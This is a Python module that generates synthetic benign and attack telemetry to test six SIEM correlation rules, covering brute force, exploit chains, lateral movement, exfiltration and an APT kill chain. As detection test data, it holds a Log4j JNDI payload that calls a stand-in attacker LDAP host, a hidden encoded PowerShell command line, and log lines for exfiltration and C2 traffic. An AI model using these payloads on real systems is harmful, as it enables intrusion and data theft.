"""
Synthetic Datasets and Telemetry Generators for OpenSOC Forge Correlation Engine.
Provides deterministic, realistic fixtures for:
1. Benign normal telemetry across all 6 sources (Wazuh, Suricata, Squid, Check Point, NetWitness, AD).
2. Multi-stage attack log sequences specifically targeting the 6 correlation rules:
   - RULE-CORR-001: Multi-Source Brute Force
   - RULE-CORR-002: Port Scan to Exploit Chain
   - RULE-CORR-003: Lateral Movement
   - RULE-CORR-004: Web Exploit to Data Exfiltration
   - RULE-CORR-005: Privilege Escalation & Persistence
   - RULE-CORR-006: Multi-Stage APT Campaign
3. Edge-case fixtures: Out-of-order logs, window boundaries, deduplication storms, case variance.
"""

from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional, Tuple, Union
import uuid

# ==============================================================================
# 1. Benign Fixtures Generator
# ==============================================================================

def get_benign_wazuh_event(base_time: Optional[datetime] = None) -> Dict[str, Any]:
    t = base_time or datetime.now(timezone.utc)
    return {
        "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f%z") if t.tzinfo else t.isoformat() + "Z",
        "rule": {
            "id": "5715",
            "level": 3,
            "description": "sshd: authentication succeeded.",
            "groups": ["syslog", "sshd", "authentication_success"],
        },
        "agent": {"id": "001", "name": "rhel-client-01", "ip": "192.168.10.150"},
        "data": {"srcuser": "appuser", "srcip": "192.168.10.20", "dstport": 22},
    }


def get_benign_suricata_event(base_time: Optional[datetime] = None) -> Dict[str, Any]:
    t = base_time or datetime.now(timezone.utc)
    return {
        "timestamp": t.isoformat(),
        "flow_id": 981247192,
        "event_type": "dns",
        "src_ip": "192.168.10.150",
        "src_port": 54312,
        "dest_ip": "8.8.8.8",
        "dest_port": 53,
        "proto": "UDP",
        "dns": {
            "type": "query",
            "id": 1420,
            "rrname": "updates.rockylinux.org",
            "rrtype": "A",
            "tx_id": 0,
        },
    }


def get_benign_squid_event(base_time: Optional[datetime] = None) -> str:
    t = base_time or datetime.now(timezone.utc)
    epoch = t.timestamp()
    return f"{epoch:.3f} 145 192.168.10.150 TCP_MISS/200 4812 GET https://pypi.org/simple/requests/ - HIER_DIRECT/151.101.128.223 application/json"


def get_benign_checkpoint_event(base_time: Optional[datetime] = None) -> str:
    t = base_time or datetime.now(timezone.utc)
    time_str = t.strftime("%Y-%m-%d %H:%M:%S")
    return f"time={time_str}|action=accept|orig=fw-cluster-01|src=192.168.10.150|dst=142.251.154.119|proto=tcp|s_port=51230|service=443|rule=101|product=FireWall-1"


def get_benign_netwitness_event(base_time: Optional[datetime] = None) -> Dict[str, Any]:
    t = base_time or datetime.now(timezone.utc)
    return {
        "sessionId": 501928,
        "time": int(t.timestamp()),
        "sourceId": "f3574b67-5559-483c-8a01-e6add64b2c20",
        "metas": [
            ["device.type", "nwendpoint"],
            ["device.class", "Network Sensor"],
            ["ip.src", "192.168.10.150"],
            ["ip.dst", "192.168.10.20"],
            ["tcp.dstport", 443],
            ["service", "ssl"],
            ["action", "session_closed"],
            ["payload.bytes", 1520],
        ],
    }


def get_benign_active_directory_event(base_time: Optional[datetime] = None) -> Dict[str, Any]:
    t = base_time or datetime.now(timezone.utc)
    return {
        "Event": {
            "System": {
                "EventID": 4624,
                "TimeCreated": {"SystemTime": t.isoformat()},
                "Computer": "DC01.TBLBD.COM",
            },
            "EventData": {
                "TargetUserName": "resanul",
                "TargetDomainName": "TBLBD",
                "LogonType": 2,
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
                "IpAddress": "127.0.0.1",
                "IpPort": 0,
            },
        }
    }


def generate_benign_dataset(base_time: Optional[datetime] = None) -> List[Union[Dict[str, Any], str]]:
    """Return a combined benign telemetry stream across all 6 sources."""
    t = base_time or datetime.now(timezone.utc)
    return [
        get_benign_wazuh_event(t),
        get_benign_suricata_event(t + timedelta(seconds=1)),
        get_benign_squid_event(t + timedelta(seconds=2)),
        get_benign_checkpoint_event(t + timedelta(seconds=3)),
        get_benign_netwitness_event(t + timedelta(seconds=4)),
        get_benign_active_directory_event(t + timedelta(seconds=5)),
    ]


# ==============================================================================
# 2. Attack Sequence Datasets Generators (Positive Verification)
# ==============================================================================

def generate_rule_001_brute_force_attack(
    user: str = "Administrator",
    attacker_ip: str = "198.51.100.84",
    fail_count: int = 12,
    with_escalation: bool = False,
    base_time: Optional[datetime] = None,
) -> List[Dict[str, Any]]:
    """
    Generate multi-source brute force sequence:
    Alternating Active Directory 4625 and Wazuh SSH authentication failures.
    """
    t = base_time or datetime.now(timezone.utc)
    events: List[Dict[str, Any]] = []

    for i in range(fail_count):
        evt_time = t + timedelta(seconds=i * 5)
        if i % 2 == 0:
            # AD 4625
            events.append({
                "Event": {
                    "System": {
                        "EventID": 4625,
                        "TimeCreated": {"SystemTime": evt_time.isoformat()},
                        "Computer": "DC01.TBLBD.COM",
                    },
                    "EventData": {
                        "TargetUserName": user,
                        "TargetDomainName": "TBLBD",
                        "Status": "0xC000006D",
                        "SubStatus": "0xC000006A",
                        "FailureReason": "Unknown user name or bad password",
                        "IpAddress": attacker_ip,
                        "IpPort": 49100 + i,
                    },
                }
            })
        else:
            # Wazuh 5710
            events.append({
                "timestamp": evt_time.isoformat(),
                "rule": {
                    "id": "5710",
                    "level": 5,
                    "description": "sshd: Attempt to login using a non-existent user",
                    "groups": ["syslog", "sshd", "authentication_failed"],
                },
                "agent": {"id": "001", "name": "rhel-client-01", "ip": "192.168.10.150"},
                "data": {"srcuser": user, "srcip": attacker_ip, "dstport": 22},
            })

    if with_escalation:
        esc_time = t + timedelta(seconds=fail_count * 5 + 10)
        events.append({
            "Event": {
                "System": {
                    "EventID": 4624,
                    "TimeCreated": {"SystemTime": esc_time.isoformat()},
                    "Computer": "DC01.TBLBD.COM",
                },
                "EventData": {
                    "TargetUserName": user,
                    "TargetDomainName": "TBLBD",
                    "LogonType": 2,
                    "IpAddress": attacker_ip,
                },
            }
        })

    return events


def generate_rule_002_port_scan_exploit_attack(
    attacker_ip: str = "198.51.100.84",
    victim_ip: str = "172.31.105.11",
    distinct_ports_count: int = 18,
    base_time: Optional[datetime] = None,
) -> List[Union[str, Dict[str, Any]]]:
    """
    Generate Check Point port sweep (>= 15 distinct ports in 60s)
    followed by Suricata Log4j RCE exploit within 240s.
    """
    t = base_time or datetime.now(timezone.utc)
    events: List[Union[str, Dict[str, Any]]] = []

    # Ports sample
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 8080, 8443, 9200]
    selected_ports = ports[:distinct_ports_count]

    # Stage 1: Port sweep within 30 seconds
    for i, port in enumerate(selected_ports):
        p_time = t + timedelta(seconds=i * 1.5)
        time_str = p_time.strftime("%Y-%m-%d %H:%M:%S")
        events.append(
            f"time={time_str}|action=drop|orig=fw-cluster-01|src={attacker_ip}|dst={victim_ip}|proto=tcp|s_port={50000+i}|service={port}|rule=999|reason=Connection rejected|product=FireWall-1"
        )

    # Stage 2: Suricata exploit alert 45 seconds later
    exploit_time = t + timedelta(seconds=45)
    events.append({
        "timestamp": exploit_time.isoformat(),
        "flow_id": 1827419827,
        "event_type": "alert",
        "src_ip": attacker_ip,
        "src_port": 49152,
        "dest_ip": victim_ip,
        "dest_port": 8080,
        "proto": "TCP",
        "alert": {
            "action": "allowed",
            "gid": 1,
            "signature_id": 2024150,
            "rev": 1,
            "signature": "ET EXPLOIT Apache Log4j JNDI RCE Attempt (CVE-2021-44228)",
            "category": "Attempted Administrator Privilege Gain",
            "severity": 1,
        },
        "http": {
            "hostname": "web-portal.corp.internal",
            "url": "/login",
            "http_user_agent": f"${{jndi:ldap://{attacker_ip}:1389/Exploit}}",
            "http_method": "POST",
        },
    })

    return events


def generate_rule_003_lateral_movement_attack(
    source_ip: str = "10.0.0.88",
    target_host: str = "db-cluster-node-02",
    user: str = "svc_admin",
    base_time: Optional[datetime] = None,
) -> List[Dict[str, Any]]:
    """
    Generate AD 4624 LogonType 3 followed within 60s by Wazuh process execution (PowerShell).
    """
    t = base_time or datetime.now(timezone.utc)
    logon_time = t
    proc_time = t + timedelta(seconds=45)

    return [
        # Stage 1: AD 4624 LogonType 3
        {
            "Event": {
                "System": {
                    "EventID": 4624,
                    "TimeCreated": {"SystemTime": logon_time.isoformat()},
                    "Computer": target_host,
                },
                "EventData": {
                    "TargetUserName": user,
                    "TargetDomainName": "TBLBD",
                    "LogonType": 3,
                    "AuthenticationPackageName": "NTLM",
                    "IpAddress": source_ip,
                    "IpPort": 51920,
                },
            }
        },
        # Stage 2: Wazuh process execution
        {
            "timestamp": proc_time.isoformat(),
            "rule": {
                "id": "100201",
                "level": 12,
                "description": "Suspicious PowerShell execution via administrative logon",
                "groups": ["syslog", "process"],
            },
            "agent": {"id": "002", "name": target_host, "ip": "10.0.0.99"},
            "data": {
                "srcuser": user,
                "process": "powershell.exe",
                "command": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
            },
            "full_log": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
        },
    ]


def generate_rule_004_web_exploit_exfil_attack(
    server_ip: str = "172.31.105.11",
    attacker_ip: str = "198.51.100.84",
    exfil_dest_ip: str = "198.51.100.99",
    bytes_exfil: int = 12582912,
    base_time: Optional[datetime] = None,
) -> List[Union[Dict[str, Any], str]]:
    """
    Generate Suricata web exploit alert followed within 180s by Squid heavy POST transfer (12MB).
    """
    t = base_time or datetime.now(timezone.utc)
    exploit_time = t
    exfil_time = t + timedelta(seconds=90)

    suricata_event = {
        "timestamp": exploit_time.isoformat(),
        "flow_id": 88129182,
        "event_type": "alert",
        "src_ip": attacker_ip,
        "src_port": 50123,
        "dest_ip": server_ip,
        "dest_port": 443,
        "proto": "TCP",
        "alert": {
            "signature": "ET EXPLOIT Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)",
            "signature_id": 2024729,
            "category": "Web Application Attack",
            "severity": 1,
        },
    }

    squid_epoch = exfil_time.timestamp()
    squid_line = f"{squid_epoch:.3f} 1890 {server_ip} TCP_MISS/200 {bytes_exfil} POST http://{exfil_dest_ip}/upload/drop.php - HIER_DIRECT/{exfil_dest_ip} application/octet-stream"

    return [suricata_event, squid_line]


def generate_rule_005_privilege_escalation_attack(
    user: str = "backdoor_user",
    host: str = "bastion-gw-01",
    base_time: Optional[datetime] = None,
) -> List[Dict[str, Any]]:
    """
    Generate AD 4728 (Member added to "Domain Admins") followed within 120s by Wazuh FIM modifying /etc/sudoers.
    """
    t = base_time or datetime.now(timezone.utc)
    ad_time = t
    fim_time = t + timedelta(seconds=75)

    return [
        # Stage 1: AD 4728
        {
            "Event": {
                "System": {
                    "EventID": 4728,
                    "TimeCreated": {"SystemTime": ad_time.isoformat()},
                    "Computer": "DC01.TBLBD.COM",
                },
                "EventData": {
                    "MemberName": f"CN={user},OU=Users,DC=TBLBD,DC=COM",
                    "TargetUserName": "Domain Admins",
                    "SubjectUserName": "compromised_admin",
                },
            }
        },
        # Stage 2: Wazuh FIM /etc/sudoers
        {
            "timestamp": fim_time.isoformat(),
            "rule": {
                "id": "550",
                "level": 12,
                "description": "Integrity checksum changed for sensitive file /etc/sudoers",
                "groups": ["ossec", "syscheck"],
            },
            "agent": {"id": "005", "name": host, "ip": "10.0.0.5"},
            "syscheck": {
                "path": "/etc/sudoers",
                "event": "modified",
                "sha256_after": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "size_after": 1420,
            },
            "data": {"srcuser": user},
        },
    ]


def generate_rule_006_multi_stage_apt_attack(
    attacker_ip: str = "198.51.100.84",
    victim_ip: str = "172.31.105.11",
    victim_host: str = "finance-app-srv",
    user: str = "admin_service",
    base_time: Optional[datetime] = None,
) -> List[Union[Dict[str, Any], str]]:
    """
    Generate complete 5-stage APT campaign killchain across Check Point, Suricata, Squid, AD, NetWitness.
    """
    t = base_time or datetime.now(timezone.utc)

    # Stage 1 (T=0s): Check Point firewall port sweep drop
    cp_time = t
    cp_line = f"time={cp_time.strftime('%Y-%m-%d %H:%M:%S')}|action=drop|orig=fw-cluster-01|src={attacker_ip}|dst={victim_ip}|proto=tcp|s_port=49110|service=1433|rule=999|reason=Connection rejected|product=FireWall-1"

    # Stage 2 (T=120s): Suricata exploit alert
    suricata_time = t + timedelta(seconds=120)
    suricata_event = {
        "timestamp": suricata_time.isoformat(),
        "flow_id": 9812411,
        "event_type": "alert",
        "src_ip": attacker_ip,
        "src_port": 51234,
        "dest_ip": victim_ip,
        "dest_port": 8080,
        "alert": {
            "signature": "ET EXPLOIT Spring4Shell Remote Code Execution (CVE-2022-22965)",
            "severity": 1,
            "signature_id": 2026190,
        },
    }

    # Stage 3 (T=300s): Squid proxy C2 CONNECT beaconing
    squid_time = t + timedelta(seconds=300)
    squid_line = f"{squid_time.timestamp():.3f} 210 {victim_ip} TCP_TUNNEL/200 4812 CONNECT c2.evil-corp-apt.com:443 - HIER_DIRECT/198.51.100.99 -"

    # Stage 4 (T=500s): Active Directory 4624 Lateral logon
    ad_time = t + timedelta(seconds=500)
    ad_event = {
        "Event": {
            "System": {
                "EventID": 4624,
                "TimeCreated": {"SystemTime": ad_time.isoformat()},
                "Computer": victim_host,
            },
            "EventData": {
                "TargetUserName": user,
                "TargetDomainName": "TBLBD",
                "LogonType": 3,
                "IpAddress": victim_ip,
            },
        }
    }

    # Stage 5 (T=750s): RSA NetWitness high-volume outbound exfiltration
    nw_time = t + timedelta(seconds=750)
    nw_event = {
        "sessionId": 9018274,
        "time": int(nw_time.timestamp()),
        "sourceId": "f3574b67-5559-483c-8a01-e6add64b2c20",
        "metas": [
            ["device.type", "nwendpoint"],
            ["ip.src", victim_ip],
            ["ip.dst", "198.51.100.99"],
            ["tcp.dstport", 8443],
            ["action", "anomalous_outbound"],
            ["payload.bytes", 15728640],  # 15 MB
            ["threat.desc", "High volume binary stream to unknown ASN"],
        ],
    }

    return [cp_line, suricata_event, squid_line, ad_event, nw_event]


# ==============================================================================
# 3. Edge-Case Datasets Generators
# ==============================================================================

def generate_edge_case_out_of_order() -> List[Union[Dict[str, Any], str]]:
    """
    Returns events delivered out of chronological order (T+10s delivered before T).
    """
    t = datetime.now(timezone.utc)
    t_early = t
    t_late = t + timedelta(seconds=10)

    evt_1 = {
        "flow_id": 1001,
        "timestamp": t_late.isoformat(),
        "event_type": "alert",
        "src_ip": "1.2.3.4",
        "dest_ip": "5.6.7.8",
        "alert": {"signature": "Test Alert 2", "severity": 2, "signature_id": 200},
    }
    evt_2 = {
        "flow_id": 1002,
        "timestamp": t_early.isoformat(),
        "event_type": "alert",
        "src_ip": "1.2.3.4",
        "dest_ip": "5.6.7.8",
        "alert": {"signature": "Test Alert 1", "severity": 2, "signature_id": 100},
    }

    # Deliver evt_1 (T+10s) first, then evt_2 (T)
    return [evt_1, evt_2]


def generate_edge_case_window_boundary() -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
    """
    Generates 9 failed logons at T=0, and 10th failed logon at T=301s (window is 300s).
    """
    t = datetime.now(timezone.utc)
    events_in_window: List[Dict[str, Any]] = []

    for i in range(9):
        events_in_window.append({
            "Event": {
                "System": {
                    "EventID": 4625,
                    "TimeCreated": {"SystemTime": (t + timedelta(seconds=i * 2)).isoformat()},
                    "Computer": "DC01.TBLBD.COM",
                },
                "EventData": {
                    "TargetUserName": "boundary_user",
                    "IpAddress": "192.168.10.99",
                },
            }
        })

    expired_event = {
        "Event": {
            "System": {
                "EventID": 4625,
                "TimeCreated": {"SystemTime": (t + timedelta(seconds=301)).isoformat()},
                "Computer": "DC01.TBLBD.COM",
            },
            "EventData": {
                "TargetUserName": "boundary_user",
                "IpAddress": "192.168.10.99",
            },
        }
    }
    return events_in_window, expired_event


def generate_edge_case_case_sensitivity() -> List[Dict[str, Any]]:
    """
    Generates logons for mixed-case user identities: 'Administrator', 'administrator', 'ADMINISTRATOR'.
    """
    t = datetime.now(timezone.utc)
    cases = ["Administrator", "administrator", "ADMINISTRATOR", "AdMiNiStRaToR"]
    events = []
    for i in range(12):
        user_cased = cases[i % len(cases)]
        events.append({
            "Event": {
                "System": {
                    "EventID": 4625,
                    "TimeCreated": {"SystemTime": (t + timedelta(seconds=i * 5)).isoformat()},
                    "Computer": "DC01.TBLBD.COM",
                },
                "EventData": {
                    "TargetUserName": user_cased,
                    "IpAddress": "198.51.100.84",
                },
            }
        })
    return events


def generate_attack_dataset(rule_id: str, base_time: Optional[datetime] = None) -> List[Any]:
    """Retrieve synthetic attack telemetry stream for a specific rule ID."""
    rid = rule_id.upper()
    if rid in ("RULE-CORR-001", "001", "1"):
        return generate_rule_001_brute_force_attack(base_time=base_time)
    if rid in ("RULE-CORR-002", "002", "2"):
        return generate_rule_002_port_scan_exploit_attack(base_time=base_time)
    if rid in ("RULE-CORR-003", "003", "3"):
        return generate_rule_003_lateral_movement_attack(base_time=base_time)
    if rid in ("RULE-CORR-004", "004", "4"):
        return generate_rule_004_web_exploit_exfil_attack(base_time=base_time)
    if rid in ("RULE-CORR-005", "005", "5"):
        return generate_rule_005_privilege_escalation_attack(base_time=base_time)
    if rid in ("RULE-CORR-006", "006", "6"):
        return generate_rule_006_multi_stage_apt_attack(base_time=base_time)
    raise ValueError(f"Unknown rule ID: {rule_id}")


def generate_all_datasets() -> Dict[str, Any]:
    """Export complete bundle of benign, attack, and edge-case datasets."""
    return {
        "benign": generate_benign_dataset(),
        "attacks": {
            "RULE-CORR-001": generate_rule_001_brute_force_attack(),
            "RULE-CORR-002": generate_rule_002_port_scan_exploit_attack(),
            "RULE-CORR-003": generate_rule_003_lateral_movement_attack(),
            "RULE-CORR-004": generate_rule_004_web_exploit_exfil_attack(),
            "RULE-CORR-005": generate_rule_005_privilege_escalation_attack(),
            "RULE-CORR-006": generate_rule_006_multi_stage_apt_attack(),
        },
        "edge_cases": {
            "case_sensitivity": generate_edge_case_case_sensitivity(),
            "out_of_order": generate_edge_case_out_of_order(),
        },
    }
